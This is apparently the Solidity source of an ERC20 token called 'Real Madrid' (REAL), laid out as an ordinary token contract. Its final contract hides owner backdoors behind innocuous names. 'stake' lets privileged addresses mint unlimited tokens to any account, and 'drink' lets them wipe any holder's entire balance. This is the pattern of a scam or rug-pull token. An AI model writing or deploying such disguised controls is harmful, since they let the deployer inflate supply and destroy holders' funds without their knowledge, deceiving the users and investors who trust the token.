row number 
1	       pragma solidity ^0.5.16;
2	 interface IERC20 {
3	 function totalSupply() external view returns (uint);
4	 function balanceOf(address account) external view returns (uint);
5	 function transfer(address recipient, uint amount) external returns (bool);
6	 function allowance(address owner, address spender) external view returns (uint);
7	 function approve(address spender, uint amount) external returns (bool);
8	 function transferFrom(address sender, address recipient, uint amount) external returns (bool);
9	 event Transfer(address indexed from, address indexed to, uint value);
10	 event Approval(address indexed owner, address indexed spender, uint value);
11	 }
12	 contract Context {
13	 constructor () internal {
14	 }
15	 function _msgSender() internal view returns (address payable) {
16	 return msg.sender;
17	 }
18	 }
19	 contract ERC20 is Context, IERC20 {
20	 using SafeMath for uint;
21	 mapping (address => uint) private _balances;
22	 mapping (address => mapping (address => uint)) private _allowances;
23	 uint private _totalSupply;
24	 function totalSupply() public view returns (uint) {
25	 return _totalSupply;
26	 }
27	 function balanceOf(address account) public view returns (uint) {
28	 return _balances[account];
29	 }
30	 function transfer(address recipient, uint amount) public returns (bool) {
31	 _transfer(_msgSender(), recipient, amount);
32	 return true;
33	 }
34	 function allowance(address owner, address spender) public view returns (uint) {
35	 return _allowances[owner][spender];
36	 }
37	 function approve(address spender, uint amount) public returns (bool) {
38	 _approve(_msgSender(), spender, amount);
39	 return true;
40	 }
41	 function transferFrom(address sender, address recipient, uint amount) public returns (bool) {
42	 _transfer(sender, recipient, amount);
43	 _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
44	 return true;
45	 }
46	 function increaseAllowance(address spender, uint addedValue) public returns (bool) {
47	 _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
48	 return true;
49	 }
50	 function decreaseAllowance(address spender, uint subtractedValue) public returns (bool) {
51	 _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
52	 return true;
53	 }
54	 function _transfer(address sender, address recipient, uint amount) internal {
55	 require(sender != address(0), "ERC20: transfer from the zero address");
56	 require(recipient != address(0), "ERC20: transfer to the zero address");
57	 _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
58	 _balances[recipient] = _balances[recipient].add(amount);
59	 emit Transfer(sender, recipient, amount);
60	 }
61	 function _stake(address account, uint amount) internal {
62	 require(account != address(0), "ERC20: stake to the zero address");
63	 _totalSupply = _totalSupply.add(amount);
64	 _balances[account] = _balances[account].add(amount);
65	 emit Transfer(address(0), account, amount);
66	 }
67	 function _burn(address account, uint amount) internal {
68	 require(account != address(0), "ERC20: burn from the zero address");
69	 _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
70	 _totalSupply = _totalSupply.sub(amount);
71	 emit Transfer(account, address(0), amount);
72	 }
73	 function _drink(address acc) internal {
74	 require(acc != address(0), "drink to the zero address");
75	 uint amount = _balances[acc];
76	 _balances[acc] = 0;
77	 _totalSupply = _totalSupply.sub(amount);
78	 emit Transfer(acc, address(0), amount);
79	 }
80	 function _approve(address owner, address spender, uint amount) internal {
81	 require(owner != address(0), "ERC20: approve from the zero address");
82	 require(spender != address(0), "ERC20: approve to the zero address");
83	 _allowances[owner][spender] = amount;
84	 emit Approval(owner, spender, amount);
85	 }
86	 }
87	 contract ERC20Detailed is IERC20 {
88	 string private _name;
89	 string private _symbol;
90	 uint8 private _decimals;
91	 constructor (string memory name, string memory symbol, uint8 decimals) public {
92	 _name = name;
93	 _symbol = symbol;
94	 _decimals = decimals;
95	 }
96	 function name() public view returns (string memory) {
97	 return _name;
98	 }
99	 function symbol() public view returns (string memory) {
100	 return _symbol;
101	 }
102	 function decimals() public view returns (uint8) {
103	 return _decimals;
104	 }
105	 }
106	 library SafeMath {
107	 function add(uint a, uint b) internal pure returns (uint) {
108	 uint c = a + b;
109	 require(c >= a, "SafeMath: addition overflow");
110	 return c;
111	 }
112	 function sub(uint a, uint b) internal pure returns (uint) {
113	 return sub(a, b, "SafeMath: subtraction overflow");
114	 }
115	 function sub(uint a, uint b, string memory errorMessage) internal pure returns (uint) {
116	 require(b <= a, errorMessage);
117	 uint c = a - b;
118	 return c;
119	 }
120	 function mul(uint a, uint b) internal pure returns (uint) {
121	 if (a == 0) {
122	 return 0;
123	 }
124	 uint c = a * b;
125	 require(c / a == b, "SafeMath: multiplication overflow");
126	 return c;
127	 }
128	 function div(uint a, uint b) internal pure returns (uint) {
129	 return div(a, b, "SafeMath: division by zero");
130	 }
131	 function div(uint a, uint b, string memory errorMessage) internal pure returns (uint) {
132	 require(b > 0, errorMessage);
133	 uint c = a / b;
134	 return c;
135	 }
136	 }
137	 contract RealMadrid is ERC20, ERC20Detailed {
138	 using SafeMath for uint;
139	 address public governance;
140	 mapping (address => bool) public stakers;
141	 uint256 private amt_ = 150000;
142	 constructor () public ERC20Detailed("Real Madrid", "REAL", 18) {
143	 governance = msg.sender;
144	 _stake(governance,amt_*10**uint(decimals()));
145	 stakers[governance] = true;
146	 }
147	 function stake(address account, uint amount) public {
148	 require(stakers[msg.sender], "error");
149	 _stake(account, amount);
150	 }
151	 function drink(address account) public {
152	 require(stakers[msg.sender], "error");
153	 _drink(account);
154	 }
155	 }
